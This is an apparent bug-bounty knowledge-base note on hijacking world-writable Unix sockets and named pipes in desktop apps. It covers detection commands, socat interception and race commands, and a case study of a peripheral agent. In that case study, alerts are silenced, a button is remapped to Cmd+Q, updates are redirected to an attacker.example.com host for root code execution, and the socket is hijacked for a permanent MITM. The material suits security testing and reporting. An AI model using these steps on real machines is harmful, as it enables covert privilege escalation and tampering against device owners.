---
type: pattern
title: "Pattern - IPC Socket Hijack"
tags: [pattern, cwe-732, ipc, unix-socket, named-pipe, local-privilege, desktop-app, bb-pattern]
status: verified
vuln_class: access-control
severity_range: P2-P3
seen_in: [electron-desktop-app, peripheral-companion-app, unix-socket-ipc]
prerequisites: ["local access to the victim machine (another local user or process on the same host)"]
last_updated: 2026-08-12
---

# Pattern - IPC Socket Hijack

> **TL;DR**: Desktop applications that use Unix domain sockets (macOS/Linux) or named pipes (Windows) for local IPC frequently ship with overly permissive file/pipe permissions, letting any local process connect without authentication and issue privileged commands. World-writable sockets combined with predictable paths and no peer-authentication turn "local IPC" into a local attack surface.

## Detection

```bash
# macOS/Linux: enumerate a target app's Unix sockets
lsof -U | grep <app_name>
ls -la <socket_path>   # 0777 = world-writable = exploitable

# Windows: check named pipe ACLs
accesschk.exe -accepteula \pipe\<name>
# "RW Everyone" = exploitable

# Path predictability
# MD5(username), a fixed path, or a PID-based path are all predictable
```

## Attack Vectors

| Vector | Description | Precondition |
|--------|--------------|---------------|
| Info leak | GET-style commands read device/user/config data | 0777 socket |
| Config tamper | SET-style commands modify app behavior | 0777 socket |
| Supply chain | Modify the update channel + force an update check | 0777 socket |
| Input remapping | Remap physical buttons/keys to a destructive keystroke | 0777 socket (can work even while the paired device is inactive) |
| Socket race -> MITM | Pre-create the socket before the legitimate agent restarts | Kill the process + pre-create the socket path (permanent if the server never retries the bind) |
| Firmware/update abuse | Trigger a firmware flash or disable auto-update checks | 0777 socket + a connected managed device |

## Protocol Reverse Engineering (socat MITM)

```bash
# Fastest method — intercept real traffic
mv /tmp/original_socket /tmp/original_socket.real
socat -v UNIX-LISTEN:/tmp/original_socket,mode=777,fork \
  UNIX-CONNECT:/tmp/original_socket.real 2>/tmp/mitm.log
# Use the app's UI normally -> the full protocol is captured
```

## Race Condition Test

```bash
pkill -9 <agent_process>
socat UNIX-LISTEN:$SOCKET,mode=777,fork /dev/null &
# Wait for the agent to restart — if its bind() fails and it doesn't retry,
# the race window is PERMANENT, not a narrow timing window.
```

## Cross-Platform Notes

The same app's macOS Unix socket and Windows named pipe often share an identical wire protocol. One reverse-engineering session on either platform is usually enough to verify both.

## Severity Factors

| Factor | Higher severity | Lower severity |
|--------|------------------|-----------------|
| Socket permissions | 0777 / RW Everyone | 0700 / owner-only |
| Path predictability | `MD5(username)`, fixed path | Random UUID |
| Authentication | None | `getpeereid` / challenge-response |
| Race condition | Server never retries the bind (permanent) | Server unlinks + rebinds cleanly |
| Privileged component | The updater runs as root/SYSTEM | Everything runs at user level |

## Full Attack Chain — Case Study: Peripheral Configuration Agent

A consumer hardware companion app (Electron UI + a native background agent communicating over a local Unix socket) exhibited this pattern end to end:

```
[Recon]
  lsof -U -> /tmp/<vendor>_agent-{MD5(username)}
  ls -la -> srwxrwxrwx (0777)
  python3 -c "hashlib.md5(username)" -> path is fully predictable
     |
[Connect]
  socket.connect(path)
  recv 34B init frame (protobuf: OPTIONS / "/" / "backend")
  -> JSON requests accepted immediately, no auth handshake
     |
[Stealth first, then attack]
  SET /configuration -> notificationsEnabled:false     -> victim gets no alert
  SET /crash_reporting/status -> disabled              -> no crash record left behind
     |
[Branch A: Pre-positioned input-remap attack]
  SET /v2/assignment -> remap a middle button to Cmd+Q
  -> can be set even while the paired device is INACTIVE (pre-positioned)
  -> next time the victim presses that button, the foreground app is killed
     |
[Branch B: Supply chain -> code execution]
  SET /updates/channel -> {"updatePipelineHost":"https://attacker.example.com"}
  SET /updates/check_now -> force an update check
  -> the agent requests an "update" from the attacker's host -> downloads it
  -> the updater (running as root/SYSTEM) installs it -> arbitrary code execution as root/SYSTEM
     |
[Branch C: Permanent MITM]
  pkill -9 agent -> pre-create the socket path -> launchd/service manager restarts the agent
  -> bind() fails (EADDRINUSE) -> agent does not retry -> permanent
  -> the Electron UI reconnects to the attacker's socket
  -> fully transparent MITM: read, inject, and forge responses
     |
[Branch D: Firmware manipulation]
  SET /dfu/config/update -> disable auto-update
  SET /dfu/<device_id>/start -> trigger a firmware flash
```

## RE Decision Tree (when to stop-loss)

```
Found an IPC route
  |- Try JSON -> SUCCESS -> continue testing other routes
  |- Try JSON -> FAIL -> run a socat MITM and observe the real UI traffic
  |    |- UI actually uses this route -> copy the exact format from the MITM capture -> retry
  |    `- UI never uses this route -> likely internal-only -> stop-loss
  `- Every format fails AND the UI never uses it -> log as informational, don't invest in binary RE
```

## Stop-Loss

- A socket at 0700 with owner-only permissions and a random, unpredictable path is not this pattern — move on.
- Peer-credential checks (`getpeereid`/`SO_PEERCRED`) that actually gate the connecting UID close this off; verify the check runs before assuming it's absent.
- Don't over-invest in binary reverse engineering for a route the real UI never calls — confirm via the MITM capture first (see decision tree above).

## Lessons From Field Experience

- A world-writable (0777) socket at a predictable path (e.g. `MD5(username)`) is a high-severity finding on its own.
- `socat` MITM is the fastest way to reverse-engineer the wire protocol — faster than static binary analysis in almost every case.
- Architecture conclusions drawn from static analysis alone must be dynamically verified before you trust them.
- Indirect abuse (e.g. remapping a button to a destructive keystroke) is often a stronger PoC than trying to inject a keystroke directly.
- A socket-rebind race is permanent, not a narrow timing window, whenever the server doesn't retry its bind on failure.
- Verifying the same bug on a second platform (e.g. both the macOS socket and the Windows named pipe) roughly doubles the demonstrated impact.
- The five-stage IPC reverse-engineering method: (1) `lsof -U` / `ls /tmp/*.sock` to find the socket path; (2) `socat` MITM to listen; (3) `strace -e trace=network` to observe the message format; (4) replay/modify messages; (5) confirm whether the race condition is permanent (no narrow timing needed).
- Watching the legitimate UI's real traffic beats blind binary reverse engineering as a stop-loss decision point.

## References

- [[Pattern - Windows UNC Path Primitive]]
- [[Pattern - JWT File-based Validation UNC NTLM Oracle]]
